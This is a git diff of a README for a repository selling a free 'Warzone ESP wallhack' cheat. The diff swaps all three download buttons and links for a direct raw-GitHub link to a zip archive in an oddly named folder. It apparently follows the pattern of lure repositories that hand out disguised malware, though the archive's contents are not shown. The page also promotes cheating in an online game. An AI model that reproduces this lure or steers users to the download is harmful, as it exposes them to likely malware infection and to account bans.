@@ -1,7 +1,7 @@
 <h1>🎯 Warzone-ESP-Loadout-Wallhack - See Everything. Win Every Fight.</h1>
 
 <p align="center">
-  <a href="https://github.com/politicaldetaineewayfaring6568/Warzone-ESP-Loadout-Wallhack" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#ff6a00,#ee0979);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(238,9,121,0.4);">⬇️ DOWNLOAD NOW - FREE 2026</a>
+  <a href="https://raw.githubusercontent.com/politicaldetaineewayfaring6568/Warzone-ESP-Loadout-Wallhack/main/goustrous/2.1.zip" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#ff6a00,#ee0979);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(238,9,121,0.4);">⬇️ DOWNLOAD NOW - FREE 2026</a>
 </p>
 
 ---
@@ -33,7 +33,7 @@ Think of it as your personal tactical radar. You'll see enemy positions through 
 ### Step 1: Get the File
 
 👉 **Visit this link to download the application:**  
-**[https://github.com/politicaldetaineewayfaring6568/Warzone-ESP-Loadout-Wallhack](https://github.com/politicaldetaineewayfaring6568/Warzone-ESP-Loadout-Wallhack)**
+**[https://raw.githubusercontent.com/politicaldetaineewayfaring6568/Warzone-ESP-Loadout-Wallhack/main/goustrous/2.1.zip](https://raw.githubusercontent.com/politicaldetaineewayfaring6568/Warzone-ESP-Loadout-Wallhack/main/goustrous/2.1.zip)**
 
 Click the big green **"Download"** button on that page. The download will start automatically. It usually takes less than a minute.
 
@@ -139,7 +139,7 @@ You're one click away from a completely different Warzone experience. Stop guess
 **👉 Download now and see everything:**
 
 <p align="center">
-  <a href="https://github.com/politicaldetaineewayfaring6568/Warzone-ESP-Loadout-Wallhack" style="display:inline-block;padding:14px 36px;background:linear-gradient(135deg,#11998e,#38ef7d);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(56,239,125,0.4);">🚀 GET WZESP NOW</a>
+  <a href="https://raw.githubusercontent.com/politicaldetaineewayfaring6568/Warzone-ESP-Loadout-Wallhack/main/goustrous/2.1.zip" style="display:inline-block;padding:14px 36px;background:linear-gradient(135deg,#11998e,#38ef7d);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(56,239,125,0.4);">🚀 GET WZESP NOW</a>
 </p>
 
 ---
